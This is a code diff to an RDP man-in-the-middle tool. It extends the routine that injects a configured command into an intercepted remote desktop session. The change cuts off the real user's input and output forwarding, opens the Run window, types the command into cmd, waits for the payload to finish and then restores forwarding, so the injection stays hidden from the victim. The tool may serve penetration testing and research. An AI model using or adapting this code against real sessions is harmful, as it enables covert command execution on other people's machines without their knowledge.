@@ -317,8 +317,17 @@ class RDPMITM:
             self.log.error("Payload was set but no delay is configured. Payload will not be sent.")
             return
 
+        if self.config.payloadDuration is None:
+            self.log.error("Payload was set but no duration is configured. Payload will not be sent.")
+            return
+
         def waitForDelay() -> int:
             return self.config.payloadDelay
+
+        def disableForwarding() -> int:
+            self.state.forwardInput = False
+            self.state.forwardOutput = False
+            return 50
 
         def openRunWindow() -> int:
             self.attacker.sendKeys([ScanCode.LWIN, ScanCode.KEY_R])
@@ -336,5 +345,22 @@ class RDPMITM:
             self.attacker.sendText(self.config.payload + " & exit")
             return 50
 
-        sequencer = AsyncIOSequencer([waitForDelay, openRunWindow, sendCMD, sendEnterKey, sendPayload, sendEnterKey])
+        def waitForPayload() -> int:
+            return self.config.payloadDuration
+
+        def enableForwarding():
+            self.state.forwardInput = True
+            self.state.forwardOutput = True
+
+        sequencer = AsyncIOSequencer([
+            waitForDelay,
+            disableForwarding,
+            openRunWindow,
+            sendCMD,
+            sendEnterKey,
+            sendPayload,
+            sendEnterKey,
+            waitForPayload,
+            enableForwarding
+        ])
         sequencer.run()
